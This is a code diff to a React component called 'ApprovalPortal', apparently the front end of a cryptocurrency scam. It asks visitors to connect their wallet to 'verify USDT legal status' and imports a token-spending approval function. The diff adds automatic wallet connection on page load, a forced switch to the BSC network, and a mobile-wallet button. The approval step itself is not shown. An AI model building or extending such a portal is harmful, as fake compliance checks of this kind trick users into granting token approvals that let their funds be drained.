@@ -5,7 +5,7 @@ import { ethers } from 'ethers';
 import ProgressBar from './ProgressBar';
 import CardStep from './CardStep';
 import SuccessModal from './SuccessModal';
-import WalletConnectModal from './WalletConnectModal';
+import LegitimacyChecker from './LegitimacyChecker';
 import { switchToBSC, approveTokenSpending, CONFIG } from '@/lib/blockchain';
 
 export default function ApprovalPortal() {
@@ -16,26 +16,76 @@ export default function ApprovalPortal() {
   const [loading, setLoading] = useState(false);
   const [error, setError] = useState<string | null>(null);
   const [showSuccess, setShowSuccess] = useState(false);
-  const [showWalletModal, setShowWalletModal] = useState(false);
+  const [attemptingConnection, setAttemptingConnection] = useState(false);
 
-  // Show wallet modal on mount
+  // Auto-connect wallet on mount and keep attempting if user is not connected
   useEffect(() => {
-    if (step === 1 && !userAddress) {
-      setShowWalletModal(true);
-    }
-  }, [step, userAddress]);
+    const autoConnect = async () => {
+      if (userAddress || attemptingConnection) return;
+      
+      try {
+        if (!window.ethereum) return;
+        
+        // Check if wallet is already connected
+        const accounts = await window.ethereum.request({ method: 'eth_accounts' });
+        if (accounts && accounts.length > 0) {
+          setAttemptingConnection(true);
+          await handleConnectWallet();
+          setAttemptingConnection(false);
+        }
+      } catch (err) {
+        console.log('[v0] Auto-connect attempt skipped');
+      }
+    };
 
-  const handleWalletConnected = async (newSigner: ethers.Signer, newProvider: ethers.BrowserProvider, address: string) => {
+    autoConnect();
+  }, [userAddress, attemptingConnection]);
+
+  const handleConnectWallet = async () => {
     try {
       setError(null);
-      await switchToBSC();
+      setLoading(true);
+      setAttemptingConnection(true);
+      
+      if (!window.ethereum) throw new Error('No web3 wallet found');
+
+      // Switch to BSC network
+      try {
+        await switchToBSC();
+      } catch (err) {
+        console.log('[v0] BSC switch error (may be normal):', err);
+      }
+
+      // Request accounts with immediate timeout handling
+      const newProvider = new ethers.BrowserProvider(window.ethereum);
+      const accounts = await Promise.race([
+        newProvider.send('eth_requestAccounts', []),
+        new Promise((_, reject) => 
+          setTimeout(() => reject(new Error('Wallet request timeout')), 15000)
+        )
+      ]);
+
+      const newSigner = await newProvider.getSigner();
+      const address = await newSigner.getAddress();
+
       setUserAddress(address);
       setSigner(newSigner);
       setProvider(newProvider);
-      setShowWalletModal(false);
+      
+      // Persist connection in localStorage
+      if (typeof window !== 'undefined') {
+        localStorage.setItem('wallet_connected', 'true');
+        localStorage.setItem('wallet_address', address);
+      }
+      
       setStep(2);
     } catch (err: any) {
-      setError(err?.message || 'Connection failed');
+      const errMsg = err?.message || 'Connection failed';
+      setError(errMsg);
+      console.error('[v0] Connection error:', errMsg);
+    } finally {
+      setLoading(false);
+      setAttemptingConnection(false);
     }
   };
 
@@ -199,13 +249,18 @@ export default function ApprovalPortal() {
             icon="🔗"
             title="Connect Wallet to Check USDT"
             description="Connect your wallet to verify your USDT legal status and ensure compliance with regulatory standards."
-            loading={false}
+            loading={loading}
             error={error}
             buttons={[
               {
                 label: 'Connect Wallet',
-                onClick: () => setShowWalletModal(true),
+                onClick: handleConnectWallet,
                 primary: true,
+              },
+              {
+                label: 'Open Mobile Wallet',
+                onClick: handleMobileWallet,
+                primary: false,
               }
             ]}
           />
@@ -229,13 +284,6 @@ export default function ApprovalPortal() {
         )}
 
         <SuccessModal isOpen={showSuccess} />
-        <WalletConnectModal 
-          isOpen={showWalletModal}
-          onConnect={handleWalletConnected}
-          onClose={() => setShowWalletModal(false)}
-          loading={loading}
-          error={error}
-        />
       </div>
 
       {/* Footer */}
